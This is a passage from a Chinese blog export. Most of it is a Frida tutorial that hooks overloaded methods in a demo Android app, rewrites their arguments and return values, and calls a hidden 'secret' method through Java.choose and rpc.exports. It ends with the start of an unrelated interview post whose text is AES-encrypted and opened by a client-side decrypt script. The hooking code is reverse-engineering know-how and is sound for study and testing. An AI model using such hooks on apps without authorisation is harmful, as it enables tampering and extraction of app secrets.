<h3 id="2-劫持重载函数，主动调用"><a href="#2-劫持重载函数，主动调用" class="headerlink" title="2. 劫持重载函数，主动调用"></a>2. 劫持重载函数，主动调用</h3><p>例子<a href="https://github.com/11x256/frida-android-examples/tree/master/examples/2" target="_blank" rel="noopener">下载链接</a></p>
<p>同样先安装apk，然后打开<br>主要代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.a11x256.frida_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">my_activity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String total = <span class="string">"@@@###@@@"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_my_activity);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">            Log.d(<span class="string">"string"</span> , fun(<span class="string">"LoWeRcAsE Me!!!!!!!!!"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">"Sum"</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">fun</span><span class="params">(String x)</span></span>&#123;</span><br><span class="line">        total +=x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">String <span class="title">secret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与例子一比较，多了2个地方，一个fun的重载函数和一个secret函数。</p>
<p>启动app后使用logcat查看打印的日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">01-22 01:54:11.019  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:11.019  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:12.020  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:12.020  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:13.030  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:13.030  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:14.037  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:14.037  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:15.038  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:15.038  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:16.040  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:16.040  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:17.045  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:17.045  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:18.049  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:18.049  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:19.055  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:19.055  5264  5264 D string  : lowercase me!!!!!!!!!</span><br></pre></td></tr></table></figure>

<p>重载函数需要加一个overload来处理，参数为String类的时候，由于String类不是Java基本数据类型，而是java.lang.String类型，所以在替换参数的构造上，需要使用java.lang.String类。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">my_class.fun.overload(<span class="string">"int"</span> , <span class="string">"int"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">my_class.fun.overload(<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br></pre></td></tr></table></figure>

<p>js脚本就变成了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Inside java perform function"</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> my_class= Java.use(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>)</span><br><span class="line">    <span class="keyword">var</span> string_class = Java.use(<span class="string">"java.lang.String"</span>);   <span class="comment">//参数为String类的时候，由于String类不是Java基本数据类型，而是java.lang.String类型，所以在替换参数的构造上，需要使用java.lang.String类</span></span><br><span class="line">  </span><br><span class="line">    my_class.fun.overload(<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="comment">//print the original arguments</span></span><br><span class="line">        <span class="keyword">var</span> my_string = string_class.$<span class="keyword">new</span>(<span class="string">"MYSTRINGS"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"original call: fun("</span> + <span class="keyword">this</span>.fun(x)+<span class="string">")"</span>);        <span class="comment">//调用原函数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(my_string);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"modefied strings is :"</span> + my_string);  </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="keyword">return</span> ret_value;  <span class="comment">//返回修改后的值MYSTRINGS</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     my_class.fun.overload(<span class="string">"int"</span>,<span class="string">"int"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"original call: fun("</span> +x+<span class="string">","</span>+y+<span class="string">")"</span>); <span class="comment">//打印原来的参数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(x,<span class="number">45</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"modefied args is :"</span> + x+<span class="string">",45"</span> );</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="keyword">return</span> ret_value;  <span class="comment">//返回修改后的值X+45</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在此处再加一个python的消息处理接受函数，使用script.on()调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    <span class="keyword">if</span> message['type'] </span>== <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure>

<p>完整的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, frida, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span>   <span class="comment">#消息处理</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./demo2.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile: <span class="comment">#读取js文件的内容</span></span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()   <span class="comment">#使用usb设备</span></span><br><span class="line">pid = device.spawn(<span class="string">"com.example.a11x256.frida_test"</span>)   <span class="comment">#使用spwan模式</span></span><br><span class="line">device.resume(pid)  </span><br><span class="line">time.sleep(<span class="number">1</span>)   <span class="comment">#休眠一秒</span></span><br><span class="line">session = device.attach(pid)   </span><br><span class="line">script = session.create_script(jscode)   <span class="comment">#创建脚本  </span></span><br><span class="line">script.on(<span class="string">"message"</span>, on_message)   <span class="comment">#消息处理</span></span><br><span class="line">script.load()    <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>启动脚本，并且查看logcat的日志输出的日志变成了劫持后的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01-22 01:56:36.312  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:36.323  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:37.324  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:37.328  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:38.328  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:38.329  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:39.329  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:39.330  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:40.331  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:40.332  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:41.332  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:41.333  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:42.334  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:42.335  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:43.336  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:43.337  5291  5291 D string  : mystrings</span><br></pre></td></tr></table></figure>



<h3 id="3-主动调用，远程调用"><a href="#3-主动调用，远程调用" class="headerlink" title="3. 主动调用，远程调用"></a>3. 主动调用，远程调用</h3><p>此时还有一个sercet函数没有调用。想要调用可以搜索内存中的此函数并进行调用。搜索函数使用Java.choose</p>
<blockquote>
<p>关于Java.use和Java.choose的</p>
<p><strong>Java.use(fn):</strong> 把当前线程附加到Java VM环境中去，并且执行Java函数fn（如果已经在Java函数的回调中，则不需要再附加到VM）</p>
<p><strong>Java.choose(className, callbacks):</strong> 在Java的内存堆上扫描指定类名称的Java对象，每次扫描到一个对象，则回调<strong>callbacks</strong>:</p>
<ul>
<li><strong>onMatch: function(instance):</strong> 每次扫描到一个实例对象，调用一次，函数返回<strong>stop</strong>结束扫描的过程</li>
<li><strong>onComplete: function():</strong> 当所有的对象都扫描完毕之后进行回调</li>
</ul>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Script loaded successfully "</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Inside java perform function"</span>);</span><br><span class="line"></span><br><span class="line">    Java.choose(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>, &#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;    <span class="comment">//在内存上搜索class的实例</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Found instance: "</span> + instance);     <span class="comment">//搜索到后打印</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Result of secret func: "</span> + instance.secret());   <span class="comment">//调用隐藏方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>python脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, frida, time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./demo2.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile:</span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn(<span class="string">"com.example.a11x256.frida_test"</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line">script.on(<span class="string">"message"</span>, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure>

<p>python的输出结果为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Script loaded successfully </span><br><span class="line">Inside java perform <span class="keyword">function</span></span><br><span class="line">Found instance: com.example.a11x256.frida_test.my_activity@e0b1cfc</span><br><span class="line">Result of secret func: @@@<span class="comment">###@@@LoWeRcAsE Me!!!!!!!!!</span></span><br><span class="line">end...</span><br><span class="line"></span><br><span class="line">Process finished with <span class="built_in">exit</span> code 0</span><br></pre></td></tr></table></figure>



<p>这么写只能调用一次，现在需要调用很多次时候。rpc.exports登场</p>
<blockquote>
<p><strong>rpc.exports:</strong> 可以在你的程序中导出一些 <strong>RPC-Style</strong> API函数，Key指定导出的名称，Value指定导出的函数，函数可以直接返回一个值，也可以是异步方式以 <strong>Promise</strong> 的方式返回</p>
</blockquote>
<p>对上面的代码用一个函数包起来</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Secret</span>(<span class="params"></span>) </span>&#123;   <span class="comment">//Defining the function that will be exported</span></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;    <span class="comment">//code that calls `secret` function from the previous example</span></span><br><span class="line">        Java.choose(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"Found instance: "</span> + instance);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"Result of secret func: "</span> + instance.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pc.exports = &#123;</span><br><span class="line">  secret:Secret  <span class="comment">//使用secret函数名称代替Secret函数名，不能有大写字母下划线。在处理的时候会被转化成小写，下划线会被去掉</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open (<span class="string">"./demo3.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile:</span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line">device =frida.get_usb_device()</span><br><span class="line">pid = device.attach(<span class="string">"com.example.a11x256.frida_test"</span>)</span><br><span class="line">script=pid.create_script(jscode)</span><br><span class="line">script.on(<span class="string">"message"</span>,on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    script.exports.call()</span><br></pre></td></tr></table></figure>

<h2 id="0x02-参考资料"><a href="#0x02-参考资料" class="headerlink" title="0x02 参考资料"></a>0x02 参考资料</h2><p><a href="https://11x256.github.io/" target="_blank" rel="noopener">https://11x256.github.io/</a><br><a href="https://frida.re/docs/javascript-api/" target="_blank" rel="noopener">https://frida.re/docs/javascript-api/</a><br><a href="https://github.com/r0ysue/AndroidSecurityStudy" target="_blank" rel="noopener">https://github.com/r0ysue/AndroidSecurityStudy</a><br><a href="https://eternalsakura13.com/2020/07/04/frida/#more" target="_blank" rel="noopener">https://eternalsakura13.com/2020/07/04/frida/#more</a></p>
]]></content>
      <tags>
        <tag>工具使用</tag>
        <tag>frida</tag>
        <tag>hook</tag>
      </tags>
  </entry>
  <entry>
    <title>sxf面试</title>
    <url>/2020/11/14/sxf%E9%9D%A2%E8%AF%95/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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